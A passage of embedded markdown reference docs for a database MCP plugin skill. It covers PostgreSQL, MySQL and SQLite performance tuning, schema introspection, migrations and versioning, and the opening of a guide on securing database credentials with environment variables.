= 4GB\nmin_wal_size = 1GB\n```\n\n**Query planner settings:**\n```sql\n-- Enable query statistics\nCREATE EXTENSION IF NOT EXISTS pg_stat_statements;\n\n-- Set effective cache size\nSET effective_cache_size = '6GB';\n\n-- Enable parallel queries (if supported)\nSET max_parallel_workers_per_gather = 4;\n```\n\n### MySQL Optimizations\n\n**Configuration tuning:**\n```ini\n# my.cnf\n[mysqld]\n# Buffer pool (50-80% of RAM)\ninnodb_buffer_pool_size = 4G\n\n# Log file size\ninnodb_log_file_size = 512M\ninnodb_log_buffer_size = 16M\n\n# Connection limits\nmax_connections = 200\nmax_connect_errors = 1000000\n\n# Query cache (MySQL 5.7 and earlier)\nquery_cache_type = 1\nquery_cache_size = 128M\nquery_cache_limit = 2M\n\n# InnoDB settings\ninnodb_flush_log_at_trx_commit = 2  # Less strict for better performance\ninnodb_file_per_table = 1\ninnodb_open_files = 500\n```\n\n**MyISAM to InnoDB migration:**\n```sql\n-- Convert table to InnoDB\nALTER TABLE mytable ENGINE=InnoDB;\n\n-- Check table engine\nSHOW TABLE STATUS WHERE Name = 'mytable';\n```\n\n### SQLite Optimizations\n\n**PRAGMA settings:**\n```sql\n-- Enable WAL mode for better concurrency\nPRAGMA journal_mode = WAL;\n\n-- Increase cache size (negative = KB)\nPRAGMA cache_size = -64000;\n\n-- Set synchronous mode (NORMAL is good balance)\nPRAGMA synchronous = NORMAL;\n\n-- Increase temp store memory\nPRAGMA temp_store = MEMORY;\n\n-- Optimize for bulk inserts\nPRAGMA journal_mode = DELETE;\nPRAGMA synchronous = OFF;\n\n-- Return to normal mode after bulk operations\nPRAGMA journal_mode = WAL;\nPRAGMA synchronous = NORMAL;\n```\n\n**Scripting WAL mode:**\n```bash\n#!/bin/bash\n# Enable WAL mode for SQLite\nsqlite3 myapp.db <<'EOF'\nPRAGMA journal_mode = WAL;\nPRAGMA synchronous = NORMAL;\nPRAGMA cache_size = -64000;\nPRAGMA temp_store = MEMORY;\nEOF\n```\n\n## Bulk Operations\n\n### Batch Inserts\n\n**PostgreSQL - COPY for bulk data:**\n```sql\n-- Create temporary table\nCREATE TEMP TABLE temp_users (\n  id UUID,\n  name TEXT,\n  email TEXT\n);\n\n-- Use COPY for bulk insert (from file or STDIN)\nCOPY temp_users FROM STDIN WITH (FORMAT csv);\n```\n\n**MySQL - LOAD DATA:**\n```sql\n-- Bulk load from file\nLOAD DATA INFILE '/path/to/file.csv'\nINTO TABLE users\nFIELDS TERMINATED BY ','\nLINES TERMINATED BY '\\n'\nIGNORE 1 ROWS;\n```\n\n**Batch INSERT statement:**\n```sql\n-- Insert multiple rows at once\nINSERT INTO users (id, name, email) VALUES\n  ('uuid1', 'User 1', 'user1@example.com'),\n  ('uuid2', 'User 2', 'user2@example.com'),\n  ('uuid3', 'User 3', 'user3@example.com');\n```\n\n### Transaction Optimization\n\n**Batch in single transaction:**\n```markdown\nSteps:\n1. BEGIN transaction\n2. Execute multiple INSERT/UPDATE statements\n3. COMMIT if all successful\n4. ROLLBACK on any error\n\nBenefits:\n- Reduces transaction overhead\n- Ensures atomicity\n- Better performance than individual commits\n\nExample:\nBEGIN;\nINSERT INTO orders (...) VALUES (...);\nINSERT INTO order_items (...) VALUES (...);\nUPDATE inventory SET quantity = quantity - 1 WHERE ...;\nCOMMIT;\n```\n\n**Optimize transaction size:**\n```markdown\nGuidelines:\n- Batch 100-1000 rows per transaction\n- Don't hold transactions open too long\n- Use SAVEPOINT for complex operations\n- Monitor transaction log size\n```\n\n## Scaling Strategies\n\n### Read Replicas\n\n**PostgreSQL - Streaming replication:**\n```bash\n# Primary server\nexport POSTGRES_URL=\"postgresql://user:pass@primary:5432/myapp\"\n\n# Read replica\nexport READ_REPLICA_URL=\"postgresql://user:pass@replica:5432/myapp\"\n```\n\n```json\n{\n  \"postgres_primary\": {\n    \"command\": \"npx\",\n    \"args\": [\"-y\", \"@modelcontextprotocol/server-postgres\", \"${PRIMARY_DB_URL}\"],\n    \"env\": {\n      \"DATABASE_URL\": \"${PRIMARY_POSTGRES_URL}\"\n    }\n  },\n  \"postgres_replica\": {\n    \"command\": \"npx\",\n    \"args\": [\"-y\", \"@modelcontextprotocol/server-postgres\", \"${REPLICA_DB_URL}\"],\n    \"env\": {\n      \"DATABASE_URL\": \"${READ_REPLICA_POSTGRES_URL}\"\n    }\n  }\n}\n```\n\n**Read/write splitting:**\n```markdown\nSteps:\n1. Route SELECT queries to read replica\n2. Route INSERT/UPDATE/DELETE to primary\n3. Implement connection pooling per server\n4. Monitor replication lag\n\nExample:\nif query.lower().startswith('select'):\n    use_read_replica()\nelse:\n    use_primary()\n```\n\n### Sharding\n\n**Horizontal sharding strategy:**\n```markdown\nShard by:\n- User ID (hash-based)\n- Geographic region\n- Time (date ranges)\n- Business entity\n\nExample - Shard by user ID:\nShard 1: Users 0-999\nShard 2: Users 1000-1999\nShard 3: Users 2000-2999\n```\n\n**Sharding implementation:**\n```python\ndef get_shard(user_id):\n    \"\"\"Determine which shard to use based on user_id\"\"\"\n    shard_number = hash(user_id) % NUM_SHARDS\n    return f\"shard_{shard_number}\"\n\ndef get_user_data(user_id):\n    shard = get_shard(user_id)\n    db = connect_to_shard(shard)\n    return db.query(\"SELECT * FROM users WHERE id = $1\", user_id)\n```\n\n### Connection Pool Optimization\n\n**Pool sizing:**\n```markdown\nFormula:\n- Calculate max connections per pool\n- Leave headroom for admin connections\n- Monitor pool utilization\n\nExample:\nTotal DB connections: 100\nNumber of application instances: 5\nPool size per instance: 100 / 5 = 20\nHeadroom: 20 - 5 = 15 (keep 5 for monitoring/admin)\n```\n\n**Pool monitoring:**\n```markdown\nMonitor:\n- Pool size utilization\n- Wait time for connection\n- Connection age\n- Errors per second\n\nAlert when:\n- Pool utilization > 80%\n- Wait time > 1 second\n- Connection age > 1 hour\n```\n\n## Performance Checklist\n\n### Before Deployment\n\n- [ ] Connection pool configured\n- [ ] Database indexes created\n- [ ] Slow queries identified and optimized\n- [ ] Query cache configured\n- [ ] Monitoring in place\n- [ ] Load testing completed\n- [ ] Baseline metrics established\n- [ ] Connection timeouts set\n- [ ] Query timeouts configured\n\n### After Deployment\n\n- [ ] Monitor query performance\n- [ ] Track connection pool usage\n- [ ] Monitor cache hit rates\n- [ ] Review slow query logs\n- [ ] Check index usage\n- [ ] Monitor database size growth\n- [ ] Track error rates\n- [ ] Review replication lag\n- [ ] Benchmark against baseline\n\n## Best Practices Summary\n\n### For Developers\n\n1. **Use connection pooling** - Reuse connections efficiently\n2. **Write efficient queries** - Select only needed columns, use indexes\n3. **Implement caching** - Cache frequently accessed data\n4. **Monitor performance** - Track query times and error rates\n5. **Use prepared statements** - Reduce parsing overhead\n6. **Batch operations** - Combine multiple queries when possible\n7. **Optimize pagination** - Use keyset instead of LIMIT/OFFSET\n8. **Review execution plans** - Understand how queries execute\n\n### For Operations\n\n1. **Size connection pools appropriately** - Based on load and resources\n2. **Monitor database metrics** - Connections, cache, slow queries\n3. **Set up alerting** - For performance degradation\n4. **Regular maintenance** - VACUUM, ANALYZE, optimize\n5. **Plan for scaling** - Read replicas, sharding\n6. **Test under load** - Performance testing before production\n7. **Document performance baseline** - Know your normal\n8. **Automate monitoring** - Continuous performance tracking\n\n## Conclusion\n\nDatabase performance requires:\n- **Proper connection pooling** for efficient resource use\n- **Query optimization** with indexes and efficient SQL\n- **Caching strategies** to reduce database load\n- **Performance monitoring** to identify issues early\n- **Database-specific tuning** for PostgreSQL, MySQL, SQLite\n- **Scaling strategies** like read replicas and sharding\n- **Regular maintenance** to keep databases healthy\n- **Automated monitoring** for continuous performance tracking\n\nFollow these practices to ensure optimal database performance in MCP-based plugins.",
        "plugins/sys-core/skills/integrating-mcp/references/schema-management.md": "# Schema Management for Database MCP Integration\n\nComplete guide to schema introspection, migration strategies, and version management for database MCP servers.\n\n## Overview\n\nSchema management is crucial for maintaining database integrity and enabling dynamic operations through MCP. This guide covers schema introspection, migration strategies, versioning, and best practices for database schema management.\n\n## Schema Introspection\n\n### PostgreSQL Schema Discovery\n\n**List all tables:**\n```sql\nSELECT table_schema, table_name, table_type\nFROM information_schema.tables\nWHERE table_schema NOT IN ('information_schema', 'pg_catalog')\nORDER BY table_schema, table_name;\n```\n\n**Get table structure:**\n```sql\nSELECT\n    column_name,\n    data_type,\n    is_nullable,\n    column_default,\n    character_maximum_length,\n    numeric_precision,\n    numeric_scale\nFROM information_schema.columns\nWHERE table_schema = 'public'\n  AND table_name = 'users'\nORDER BY ordinal_position;\n```\n\n**Get indexes:**\n```sql\nSELECT\n    i.relname AS index_name,\n    a.attname AS column_name,\n    ix.indisunique AS is_unique,\n    ix.indisprimary AS is_primary\nFROM pg_class t\nJOIN pg_index ix ON t.oid = ix.indrelid\nJOIN pg_class i ON i.oid = ix.indexrelid\nJOIN pg_attribute a ON a.attrelid = t.oid AND a.attnum = ANY(ix.indkey)\nWHERE t.relkind = 'r'\n  AND t.relname = 'users';\n```\n\n**Get foreign keys:**\n```sql\nSELECT\n    tc.constraint_name,\n    tc.table_name AS foreign_table_name,\n    kcu.column_name AS foreign_column_name,\n    ccu.table_name AS referenced_table_name,\n    ccu.column_name AS referenced_column_name\nFROM information_schema.table_constraints tc\nJOIN information_schema.key_column_usage kcu\n    ON tc.constraint_name = kcu.constraint_name\n    AND tc.table_schema = kcu.table_schema\nJOIN information_schema.constraint_column_usage ccu\n    ON ccu.constraint_name = tc.constraint_name\n    AND ccu.table_schema = tc.table_schema\nWHERE tc.constraint_type = 'FOREIGN KEY'\n    AND tc.table_name = 'orders';\n```\n\n**Get triggers:**\n```sql\nSELECT\n    trigger_name,\n    event_manipulation,\n    action_statement\nFROM information_schema.triggers\nWHERE event_object_table = 'users';\n```\n\n### MySQL Schema Discovery\n\n**List all tables:**\n```sql\nSELECT table_schema, table_name, table_type\nFROM information_schema.tables\nWHERE table_schema NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')\nORDER BY table_schema, table_name;\n```\n\n**Get table structure:**\n```sql\nSELECT\n    column_name,\n    data_type,\n    is_nullable,\n    column_default,\n    character_maximum_length,\n    column_key,\n    extra\nFROM information_schema.columns\nWHERE table_schema = 'myapp'\n  AND table_name = 'users'\nORDER BY ordinal_position;\n```\n\n**Get indexes:**\n```sql\nSELECT\n    index_name,\n    non_unique,\n    column_name,\n    seq_in_index\nFROM information_schema.statistics\nWHERE table_schema = 'myapp'\n  AND table_name = 'users'\nORDER BY index_name, seq_in_index;\n```\n\n**Get foreign keys:**\n```sql\nSELECT\n    constraint_name,\n    table_name,\n    column_name,\n    referenced_table_name,\n    referenced_column_name\nFROM information_schema.key_column_usage\nWHERE table_schema = 'myapp'\n  AND referenced_table_name IS NOT NULL;\n```\n\n### SQLite Schema Discovery\n\n**List all tables:**\n```sql\nSELECT name AS table_name, type\nFROM sqlite_master\nWHERE type IN ('table', 'view')\n  AND name NOT LIKE 'sqlite_%'\nORDER BY name;\n```\n\n**Get table structure:**\n```sql\nPRAGMA table_info(users);\n```\n\n**Get indexes:**\n```sql\nPRAGMA index_list(users);\n\n-- Get index details\nPRAGMA index_info('index_name');\n```\n\n**Get foreign keys:**\n```sql\nPRAGMA foreign_key_list(users);\n```\n\n## Schema Versioning\n\n### Migration Tracking Table\n\n**PostgreSQL migration tracking:**\n```sql\nCREATE TABLE schema_migrations (\n    id SERIAL PRIMARY KEY,\n    version VARCHAR(255) NOT NULL UNIQUE,\n    description TEXT,\n    applied_at TIMESTAMP DEFAULT NOW(),\n    checksum VARCHAR(64)\n);\n\n-- Insert initial version\nINSERT INTO schema_migrations (version, description, checksum)\nVALUES ('001', 'Initial schema', 'abc123...');\n```\n\n**MySQL migration tracking:**\n```sql\nCREATE TABLE schema_migrations (\n    id INT AUTO_INCREMENT PRIMARY KEY,\n    version VARCHAR(255) NOT NULL UNIQUE,\n    description TEXT,\n    applied_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n    checksum VARCHAR(64)\n);\n```\n\n**SQLite migration tracking:**\n```sql\nCREATE TABLE schema_migrations (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    version VARCHAR(255) NOT NULL UNIQUE,\n    description TEXT,\n    applied_at DATETIME DEFAULT CURRENT_TIMESTAMP,\n    checksum VARCHAR(64)\n);\n```\n\n### Version Management Script\n\n**Check current version:**\n```sql\n-- PostgreSQL/MySQL\nSELECT version FROM schema_migrations\nORDER BY applied_at DESC\nLIMIT 1;\n\n-- SQLite\nSELECT version FROM schema_migrations\nORDER BY applied_at DESC\nLIMIT 1;\n```\n\n**Check if migration applied:**\n```sql\n-- PostgreSQL/MySQL\nSELECT EXISTS(\n    SELECT 1 FROM schema_migrations\n    WHERE version = '002'\n);\n```\n\n### Migration Naming Convention\n\n**Use semantic versioning:**\n- Format: `YYYYMMDD_HHMMSS_description.sql`\n- Examples:\n  - `20240115_143000_create_users_table.sql`\n  - `20240115_144500_add_user_email_index.sql`\n  - `20240115_150000_create_orders_table.sql`\n\n**Alternative: Sequential versioning:**\n- Format: `V{version}__{description}.sql`\n- Examples:\n  - `V001__create_users_table.sql`\n  - `V002__add_user_email_index.sql`\n  - `V003__create_orders_table.sql`\n\n## Migration Strategies\n\n### Forward Migrations\n\n**Creating a table:**\n```sql\n-- PostgreSQL/MySQL/SQLite\nCREATE TABLE users (\n    id UUID PRIMARY KEY,  -- PostgreSQL\n    id CHAR(36) PRIMARY KEY,  -- MySQL/SQLite\n    name VARCHAR(255) NOT NULL,\n    email VARCHAR(255) NOT NULL UNIQUE,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\n-- Add index\nCREATE INDEX idx_users_email ON users(email);\n\n-- Add foreign key\nALTER TABLE orders\nADD CONSTRAINT fk_orders_user_id\nFOREIGN KEY (user_id) REFERENCES users(id);\n```\n\n**Adding a column:**\n```sql\nALTER TABLE users\nADD COLUMN status VARCHAR(50) DEFAULT 'active';\n\n-- PostgreSQL - Add NOT NULL with default\nALTER TABLE users\nALTER COLUMN status SET DEFAULT 'active';\n\n-- MySQL/SQLite - Add column with default\nALTER TABLE users\nADD COLUMN status VARCHAR(50) DEFAULT 'active';\n```\n\n**Creating an index:**\n```sql\n-- PostgreSQL/MySQL/SQLite\nCREATE INDEX idx_users_created_at ON users(created_at);\n\n-- PostgreSQL - Partial index\nCREATE INDEX idx_active_users ON users(email)\nWHERE status = 'active';\n```\n\n### Rollback Migrations\n\n**Drop table:**\n```sql\n-- Reverse: Drop foreign keys first\nALTER TABLE orders DROP CONSTRAINT IF EXISTS fk_orders_user_id;\n\n-- Drop table\nDROP TABLE IF EXISTS users;\n```\n\n**Remove column:**\n```sql\n-- PostgreSQL/MySQL 8.0+\nALTER TABLE users DROP COLUMN IF EXISTS status;\n\n-- MySQL < 8.0 (requires recreating table)\n-- More complex, see migration script\n```\n\n**Drop index:**\n```sql\n-- PostgreSQL/MySQL/SQLite\nDROP INDEX IF EXISTS idx_users_email;\n```\n\n### Transactional Migrations\n\n**PostgreSQL:**\n```sql\nBEGIN;\n\n-- Multiple operations in single transaction\nCREATE TABLE orders (\n    id UUID PRIMARY KEY,\n    user_id UUID NOT NULL,\n    total DECIMAL(10, 2) NOT NULL,\n    created_at TIMESTAMP DEFAULT NOW()\n);\n\nCREATE INDEX idx_orders_user_id ON orders(user_id);\n\nALTER TABLE orders\nADD CONSTRAINT fk_orders_user_id\nFOREIGN KEY (user_id) REFERENCES users(id);\n\nCOMMIT;\n```\n\n**MySQL (InnoDB only):**\n```sql\nSTART TRANSACTION;\n\nCREATE TABLE orders (\n    id CHAR(36) PRIMARY KEY,\n    user_id CHAR(36) NOT NULL,\n    total DECIMAL(10, 2) NOT NULL,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\nCREATE INDEX idx_orders_user_id ON orders(user_id);\n\nCOMMIT;\n```\n\n**SQLite:**\n```sql\nBEGIN TRANSACTION;\n\nCREATE TABLE orders (\n    id CHAR(36) PRIMARY KEY,\n    user_id CHAR(36) NOT NULL,\n    total DECIMAL(10, 2) NOT NULL,\n    created_at DATETIME DEFAULT CURRENT_TIMESTAMP\n);\n\nCREATE INDEX idx_orders_user_id ON orders(user_id);\n\nCOMMIT;\n```\n\n## Schema Validation\n\n### Data Type Validation\n\n**Validate against schema:**\n```sql\n-- PostgreSQL - Check data types\nSELECT column_name, data_type, is_nullable\nFROM information_schema.columns\nWHERE table_schema = 'public'\n  AND table_name = 'users';\n\n-- MySQL - Check data types\nSELECT column_name, data_type, is_nullable, column_default\nFROM information_schema.columns\nWHERE table_schema = 'myapp'\n  AND table_name = 'users';\n```\n\n**Validate constraints:**\n```sql\n-- Check constraints\nSELECT\n    tc.constraint_name,\n    tc.constraint_type,\n    tc.table_name,\n    kcu.column_name\nFROM information_schema.table_constraints tc\nJOIN information_schema.key_column_usage kcu\n    ON tc.constraint_name = kcu.constraint_name\n    AND tc.table_schema = kcu.table_schema\nWHERE tc.table_name = 'users';\n```\n\n### Schema Consistency Checks\n\n**Check referential integrity:**\n```sql\n-- PostgreSQL - Find orphaned records\nSELECT o.id\nFROM orders o\nLEFT JOIN users u ON o.user_id = u.id\nWHERE u.id IS NULL;\n\n-- MySQL - Find orphaned records\nSELECT o.id\nFROM orders o\nLEFT JOIN users u ON o.user_id = u.id\nWHERE u.id IS NULL;\n```\n\n**Check index consistency:**\n```sql\n-- PostgreSQL - Verify indexes exist\nSELECT t.relname AS table_name,\n       i.relname AS index_name,\n       a.attname AS column_name\nFROM pg_class t,\n     pg_class i,\n     pg_index ix,\n     pg_attribute a\nWHERE t.oid = ix.indrelid\n  AND i.oid = ix.indexrelid\n  AND a.attrelid = t.oid\n  AND a.attnum = ANY(ix.indkey)\n  AND t.relkind = 'r'\n  AND t.relname = 'users';\n```\n\n## Dynamic Schema Operations\n\n### Schema Introspection via MCP\n\n**Use MCP tools to discover schema:**\n```markdown\nSteps:\n1. Use mcp__plugin_myplugin_postgres__query to execute:\n   SELECT table_name FROM information_schema.tables\n   WHERE table_schema = 'public';\n2. For each table, query its structure\n3. Build complete schema representation\n4. Cache schema for validation\n```\n\n**Schema cache example:**\n```markdown\nSchema cache structure:\n{\n  \"tables\": {\n    \"users\": {\n      \"columns\": [\n        {\"name\": \"id\", \"type\": \"uuid\", \"nullable\": false},\n        {\"name\": \"email\", \"type\": \"varchar\", \"nullable\": false}\n      ],\n      \"indexes\": [\n        {\"name\": \"idx_users_email\", \"columns\": [\"email\"], \"unique\": true}\n      ]\n    }\n  }\n}\n```\n\n### Dynamic Query Building\n\n**Safe query builder:**\n```markdown\nSteps:\n1. Validate table name against schema\n2. Validate columns exist\n3. Build SQL with whitelist\n4. Execute via MCP tool\n\nExample:\n- Table: users\n- Columns: id, name, email\n- Query: SELECT id, name FROM users WHERE id = $1\n\nValidation:\n Table 'users' exists\n Columns 'id', 'name' exist\n Table has permission for SELECT\n Build query safely\n```\n\n**Query validation:**\n```markdown\nValidate:\n1. Table exists in schema cache\n2. Columns exist in table\n3. Query type allowed (SELECT/INSERT/UPDATE/DELETE)\n4. No forbidden keywords (DROP, TRUNCATE, etc.)\n5. User has permission for operation\n\nReject if:\n- Table not in cache\n- Column doesn't exist\n- Forbidden operation\n- User lacks permission\n```\n\n### Schema Migration via MCP\n\n**Create migration command:**\n```markdown\n# Command: migrate-database.md\n---\ndescription: Execute database migrations\nallowed-tools: [\n  \"mcp__plugin_myplugin_postgres__execute\"\n]\n---\n\n# Database Migration\n\n## Apply Migrations\n\nTo apply pending migrations:\n1. List all migration files\n2. Check which migrations are applied\n3. Execute pending migrations in order\n4. Update migration tracking table\n5. Report results\n\n## Rollback Migrations\n\nTo rollback:\n1. Ask user for target version\n2. Verify rollback is safe\n3. Execute rollback SQL\n4. Update migration tracking table\n5. Report results\n```\n\n**Migration execution:**\n```markdown\nSteps:\n1. Read migration file\n2. Parse migration metadata\n3. Check if already applied\n4. Execute migration in transaction\n5. Record in schema_migrations table\n6. Handle errors and rollback if needed\n```\n\n## Best Practices\n\n### Migration Best Practices\n\n1. **Always use transactions** - PostgreSQL/MySQL InnoDB\n2. **Test migrations** - Apply to copy of production data\n3. **Make migrations idempotent** - Can run multiple times safely\n4. **Document migrations** - Include description and rationale\n5. **Backup before migration** - Full database backup\n6. **Plan rollback strategy** - Know how to undo changes\n7. **Version migrations** - Sequential or timestamp based\n8. **Test rollback** - Verify rollback works\n\n### Schema Design Best Practices\n\n1. **Use consistent naming** - snake_case, consistent prefixes\n2. **Document schema** - Comments and documentation\n3. **Avoid reserved words** - Use safe column names\n4. **Plan for growth** - Consider future requirements\n5. **Use appropriate data types** - Match data to type\n6. **Index foreign keys** - Always index foreign key columns\n7. **Use constraints** - NOT NULL, UNIQUE, CHECK, FOREIGN KEY\n8. **Normalize appropriately** - Balance normalization and performance\n\n### Validation Best Practices\n\n1. **Validate all inputs** - Check types, lengths, constraints\n2. **Use schema cache** - Avoid repeated introspection queries\n3. **Cache schema metadata** - Store in application memory\n4. **Update cache on changes** - Invalidate on schema updates\n5. **Version schema** - Track schema changes over time\n6. **Test schema operations** - Verify migration scripts work\n7. **Monitor schema drift** - Detect unexpected changes\n8. **Automate validation** - Include in CI/CD pipeline\n\n## Schema Documentation\n\n### Documenting Schema\n\n**Use comments:**\n```sql\n-- PostgreSQL\nCOMMENT ON TABLE users IS 'User accounts and profile information';\nCOMMENT ON COLUMN users.email IS 'Primary email address, used for login';\n\n-- MySQL\nALTER TABLE users COMMENT = 'User accounts and profile information';\nALTER TABLE users MODIFY COLUMN email VARCHAR(255) COMMENT 'Primary email address';\n```\n\n**Generate documentation:**\n```markdown\nGenerate schema docs:\n1. Query information_schema\n2. Extract tables, columns, indexes, constraints\n3. Format as markdown\n4. Include example queries\n5. Update documentation on schema change\n```\n\n**Documentation template:**\n```markdown\n# Database Schema Documentation\n\n## Tables\n\n### users\n**Description:** User accounts and profile information\n\n| Column | Type | Constraints | Description |\n|--------|------|-------------|-------------|\n| id | UUID | PK, NOT NULL | Unique user identifier |\n| email | VARCHAR(255) | UNIQUE, NOT NULL | Primary email address |\n| name | VARCHAR(255) | NOT NULL | User's full name |\n| status | VARCHAR(50) | DEFAULT 'active' | Account status |\n\n**Indexes:**\n- idx_users_email (UNIQUE on email)\n\n**Foreign Keys:**\n- None\n\n**Example Queries:**\n```sql\nSELECT id, name, email FROM users WHERE status = 'active';\nINSERT INTO users (id, email, name) VALUES ($1, $2, $3);\n```\n```\n\n## Automated Schema Management\n\n### CI/CD Integration\n\n**GitHub Actions workflow:**\n```yaml\nname: Database Migration\non:\n  push:\n    branches: [main]\n\njobs:\n  migrate:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2\n\n      - name: Setup Database\n        run: |\n          docker-compose up -d postgres\n          sleep 10  # Wait for database ready\n\n      - name: Run Migrations\n        run: |\n          for file in migrations/*.sql; do\n            echo \"Applying $file\"\n            psql $DATABASE_URL -f \"$file\"\n          done\n\n      - name: Verify Schema\n        run: |\n          psql $DATABASE_URL -c \"\n            SELECT table_name\n            FROM information_schema.tables\n            WHERE table_schema = 'public'\n          \"\n```\n\n### Schema Testing\n\n**Test schema changes:**\n```sql\n-- Test: Verify table exists\nSELECT EXISTS (\n    SELECT FROM information_schema.tables\n    WHERE table_name = 'users'\n);\n\n-- Test: Verify column exists\nSELECT EXISTS (\n    SELECT FROM information_schema.columns\n    WHERE table_name = 'users'\n    AND column_name = 'email'\n);\n\n-- Test: Verify index exists\nSELECT EXISTS (\n    SELECT FROM pg_indexes\n    WHERE tablename = 'users'\n    AND indexname = 'idx_users_email'\n);\n```\n\n## Performance Considerations\n\n### Schema Query Performance\n\n**Cache schema metadata:**\n```markdown\nCache schema for:\n- Table list (refresh hourly)\n- Column list per table (refresh daily)\n- Indexes per table (refresh daily)\n- Foreign key relationships (refresh daily)\n\nBenefits:\n- Faster query building\n- Reduced database load\n- Reduced latency\n\nInvalidate cache when:\n- Migration applied\n- Schema change detected\n- Explicit cache clear\n```\n\n**Batch schema queries:**\n```sql\n-- Single query to get all table structures\nSELECT\n    c.table_name,\n    c.column_name,\n    c.data_type,\n    c.is_nullable,\n    c.column_default,\n    tc.constraint_type\nFROM information_schema.columns c\nLEFT JOIN information_schema.key_column_usage kcu\n    ON c.table_name = kcu.table_name\n    AND c.column_name = kcu.column_name\nLEFT JOIN information_schema.table_constraints tc\n    ON kcu.constraint_name = tc.constraint_name\nWHERE c.table_schema = 'public'\nORDER BY c.table_name, c.ordinal_position;\n```\n\n## Common Issues and Solutions\n\n### Migration Failures\n\n**Problem:** Migration fails midway\n```sql\n-- Solution: Check transaction state\nSELECT * FROM pg_stat_activity WHERE state = 'active';\n\n-- Rollback if needed\nROLLBACK;\n```\n\n**Problem:** Constraint violation\n```sql\n-- Solution: Check existing data\nSELECT * FROM users WHERE email IS NULL;\n\n-- Fix data before applying constraint\nUPDATE users SET email = 'unknown@example.com' WHERE email IS NULL;\n```\n\n### Schema Drift\n\n**Problem:** Schema doesn't match documentation\n```sql\n-- Solution: Generate current schema\n\\dt  -- PostgreSQL\nSHOW TABLES;  -- MySQL\n.tables  -- SQLite\n\n-- Compare with documented schema\n-- Update documentation or fix schema\n```\n\n**Problem:** Unversioned changes\n```sql\n-- Solution: Create migration for existing changes\n-- Document current state as migration 001\n-- Add to migration history\nINSERT INTO schema_migrations (version, description)\nVALUES ('001', 'Existing schema state');\n```\n\n## Quick Reference\n\n### Common Migration Patterns\n\n**Add column:**\n```sql\nALTER TABLE table_name ADD COLUMN column_name type [constraints];\n```\n\n**Drop column:**\n```sql\nALTER TABLE table_name DROP COLUMN column_name;\n```\n\n**Rename column:**\n```sql\nALTER TABLE table_name RENAME COLUMN old_name TO new_name;\n```\n\n**Rename table:**\n```sql\nALTER TABLE old_name RENAME TO new_name;\n```\n\n**Add foreign key:**\n```sql\nALTER TABLE child_table\nADD CONSTRAINT fk_name\nFOREIGN KEY (column_name)\nREFERENCES parent_table (column_name);\n```\n\n**Create index:**\n```sql\nCREATE INDEX idx_name ON table_name (column_name);\n```\n\n### Schema Validation Queries\n\n**PostgreSQL:**\n```sql\n-- List tables\nSELECT tablename FROM pg_tables WHERE schemaname = 'public';\n\n-- Get table structure\n\\d+ table_name\n\n-- Check constraints\nSELECT conname, contype, confrelid::regclass\nFROM pg_constraint\nWHERE conrelid = 'table_name'::regclass;\n```\n\n**MySQL:**\n```sql\n-- List tables\nSHOW TABLES;\n\n-- Get table structure\nDESCRIBE table_name;\n\n-- Check foreign keys\nSELECT constraint_name, table_name, column_name,\n       referenced_table_name, referenced_column_name\nFROM information_schema.key_column_usage\nWHERE referenced_table_name IS NOT NULL;\n```\n\n**SQLite:**\n```sql\n-- List tables\n.tables\n\n-- Get table structure\n.schema table_name\n\n-- Check foreign keys\nPRAGMA foreign_key_list(table_name);\n```\n\n## Conclusion\n\nSchema management requires:\n- **Schema introspection** for dynamic operations\n- **Migration tracking** with versioning\n- **Safe migration strategies** with rollbacks\n- **Schema validation** for consistency\n- **Documentation** for maintainability\n- **Automated testing** for reliability\n- **Performance optimization** for efficiency\n- **Common issue resolution** for reliability\n\nFollow these practices to maintain database integrity and enable flexible schema operations in MCP-based plugins.",
        "plugins/sys-core/skills/integrating-mcp/references/security.md": "# Database Security for MCP Integration\n\nComplete guide to securing database connections and operations in MCP-based plugins.\n\n## Overview\n\nDatabase security is critical when integrating databases via MCP. This guide covers authentication, encryption, access control, and security best practices for database MCP servers.\n\n## Authentication Methods\n\n### Environment Variables (Recommended)\n\n**PostgreSQL:**\n```json\n{\n  \"postgres\": {\n    \"command\": \"npx\",\n    \"args\": [\"-y\", \"@modelcontextprotocol/server-postgres\", \"${DATABASE_URL}\"],\n    \"env\": {\n      \"DATABASE_URL\": \"${POSTGRES_URL}\",\n      \"PGSSLMODE\": \"require\"\n    }\n  }\n}\n```\n\n**MySQL:**\n```json\n{\n  \"mysql\": {\n    \"command\": \"npx\",\n    \"args\": [\"-y\", \"@modelcontextprotocol/server-mysql\", \"${MYSQL_URL}\"],\n    \"env\": {\n      \"MYSQL_URL\": \"${MYSQL_CONNECTION_STRING}\",\n      \"MYSQL_SSL_ENABLED\": \"true\"\n    }\n  }\n}\n```\n\n**SQLite:**\n```json\n{\n  \"sqlite\": {\n    \"command\": \"npx\",\n    \"args\": [\"-y\", \"@modelcontextprotocol/server-sqlite\", \"${SQLITE_DB_PATH}\"],\n    \"env\": {\n      \"SQLITE_DB_PATH\": \"${SQLITE_PATH}\"\n    }\n  }\n}\n```\n\n### Connection URL Components\n\n**PostgreSQL format:**\n```\npostgresql://username:password@host:port/database_name?sslmode=require&connect_timeout=10\n```\n\n**MySQL format:**\n```\nmysql://username:password@host:port/database_name?ssl-mode=REQUIRE&connect-timeout=10\n```\n\n**Individual environment variables:**\n```bash\nexport PGHOST=db.example.com\nexport PGPORT=5432\nexport PGDATABASE=myapp\nexport PGUSER=myuser\nexport PGPASSWORD=secure_password\nexport PGSSLMODE=require\n```\n\n### Using .env Files\n\nCreate `.env` file (add to `.gitignore`):\n```bash\n# Database Configuration\nDB_HOST=db.example.com\nDB_PORT=5432\nDB_NAME=myapp\nDB_USER=app_user\nDB_PASSWORD=super_secure_password_123!\nDB_SSL=true\n\n# Optional: Connection Pool Settings\nDB_POOL_MIN=5\nDB_POOL_MAX=20\n\n# Optional: Timeouts (in seconds)\nDB_CONNECT_TIMEOUT=10\nDB_QUERY_TIMEOUT=30\n```\n\nLoad environment variables:\n```bash\n# Option 1: Using source\nsource .env\n\n# Option 2: Using export\nexport $(cat .env | xargs)\n\n# Option 3: Using direnv (recommended)\n# Install: https://direnv.net/\n# .env will auto-load when entering 